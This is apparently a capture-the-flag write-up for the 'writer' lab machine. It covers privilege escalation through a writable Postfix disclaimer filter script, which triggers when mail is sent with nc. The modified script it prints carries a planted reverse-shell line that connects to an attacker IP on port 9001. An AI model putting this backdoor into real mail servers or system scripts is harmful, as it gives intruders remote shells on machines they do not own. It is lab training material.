# Postfix

Port 25 is open and running Postfix.

We can nc 127.0.0.1 25

```bash
kyle@writer:~$ nc localhost 25
220 writer.htb ESMTP Postfix (Ubuntu)
MAIL FROM:kyle@writer.htb
250 2.1.0 Ok
RCPT TO:root@writer.htb
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Get pwned
.
250 2.0.0 Ok: queued as EA2AB7E8
```


When sending, /etc/postfix/disclaimer is triggered.

So we can edit the script and add a shell command and listen on 9001 to get shell as John


# Disclaimer

/etc/postfix/disclaimer runs when 

```bash
#!/bin/sh
# Localize these.
bash -c 'bash -i >& /dev/tcp/10.10.14.179/9001 0>&1'
INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail

# Get disclaimer addresses
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses

# Exit codes from <sysexits.h>
EX_TEMPFAIL=75
EX_UNAVAILABLE=69

# Clean up when done or when aborting.
trap "rm -f in.$$" 0 1 2 3 15

# Start processing.
cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
$EX_TEMPFAIL; }

cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }

# obtain From address
from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`

if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
  /usr/bin/altermime --input=in.$$ \
                   --disclaimer=/etc/postfix/disclaimer.txt \
                   --disclaimer-html=/etc/postfix/disclaimer.txt \
                   --xheader="X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm" || \
                    { echo Message content rejected; exit $EX_UNAVAILABLE; }
fi

$SENDMAIL "$@" <in.$$

exit $?
```